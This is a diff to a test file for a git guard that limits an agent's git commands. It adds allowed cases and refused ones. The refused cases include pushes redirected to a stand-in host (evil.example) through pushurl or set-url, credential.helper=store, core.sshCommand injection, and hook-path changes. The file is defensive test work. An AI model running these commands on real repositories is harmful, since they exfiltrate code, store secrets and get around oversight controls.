@@ -1,5 +1,6 @@
 // Copied from leanish/leanish-development agents/bump-it/test/local-guard.test.ts at c6282df; see PROVENANCE.md.
-// Local changes: the guards' directory, and their messages say "agent guard"; hooks-off settings, and pushes checked against real git.
+// Local changes: the guards' directory, and their messages say "agent guard"; hooks-off and credential-helpers-off settings,
+// `git remote add`, and pushes checked against real git.
 import { spawnSync } from "node:child_process";
 import { accessSync, constants, existsSync, mkdtempSync, readFileSync } from "node:fs";
 import { chmod, mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
@@ -69,6 +70,9 @@ describe("git guard", () => {
     [["config", "user.name", "bump-it"]],
     [["-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=false", "status"]],
     [["-c", "Core.HooksPath=/dev/null", "status"]],
+    [["-c", "credential.helper=", "-c", "protocol.file.allow=never", "fetch"]],
+    [["-c", "Credential.Helper=", "fetch"]],
+    [["remote", "add", "origin", "https://github.com/leanish/leanish-development.git"]],
   ])("passes %j", async (args) => {
     expect((await run("git", args)).allowed).toBe(true);
   });
@@ -81,13 +85,22 @@ describe("git guard", () => {
     [["push", "origin", "--delete", BRANCH], "git push"],
     [["-c", "remote.origin.pushurl=https://evil.example/x", "push", "origin", BRANCH], "remote.origin.pushurl"],
     [["-c", "credential.helper=store", "fetch"], "credential.helper"],
+    [["-c", "credential.helper", "fetch"], "credential.helper"],
+    [["-c", "credential.helper= ", "fetch"], "credential.helper"],
+    [["-c", "credential.https://example.com.helper=", "fetch"], "credential.https://example.com.helper"],
+    [["-c", "credential.helper=", "-c", "credential.helper=store", "fetch"], "credential.helper"],
+    [["-c", "CREDENTIAL.HELPER=store", "fetch"], "CREDENTIAL.HELPER"],
+    [["-c", "Remote.Origin.PushURL=https://evil.example/x", "push", "origin", BRANCH], "Remote.Origin.PushURL"],
+    [["-c", "core.hooksPath=/DEV/NULL", "status"], "core.hooksPath"],
     [["-c", "core.hooksPath=/tmp/x", "status"], "core.hooksPath"],
     [["-c", "core.hooksPath=/dev/null/x", "status"], "core.hooksPath"],
     [["-c", "core.hooksPath", "status"], "core.hooksPath"],
     [["-c", "core.hooksPath=/dev/null", "-c", "core.hooksPath=/tmp/x", "status"], "core.hooksPath"],
     [["--config-env=core.sshCommand=X", "fetch"], "--config-env"],
     [["remote", "set-url", "origin", "https://evil.example/x"], "git remote set-url"],
-    [["remote", "add", "evil", "https://evil.example/x"], "git remote add"],
+    [["remote", "rename", "origin", "upstream"], "git remote rename"],
+    [["remote", "remove", "origin"], "git remote remove"],
+    [["remote", "set-url", "--push", "origin", "https://evil.example/x"], "git remote set-url"],
     [["config", "remote.origin.pushurl", "https://evil.example/x"], "remote.origin.pushurl"],
     [["config", "--global", "user.name", "x"], "--global"],
     [["config", "--edit"], "--edit"],
@@ -206,6 +219,13 @@ describe("git guard pushes, with the real git", () => {
     const outcome = git(args);
     expect(outcome.stderr).not.toContain("agent guard");
     expect(outcome.status).toBe(0);
+  });
+
+  it("refuses a push to a network remote added through the guard", () => {
+    expect(git(["remote", "add", "added", "https://example.invalid/added.git"]).status).toBe(0);
+    const outcome = git(["push", "added", "main"]);
+    expect(outcome.status).toBe(126);
+    expect(outcome.stderr).toContain("agent guard: refused: git push");
   });
 
   it("keeps the global options for the remote lookup and the push", () => {
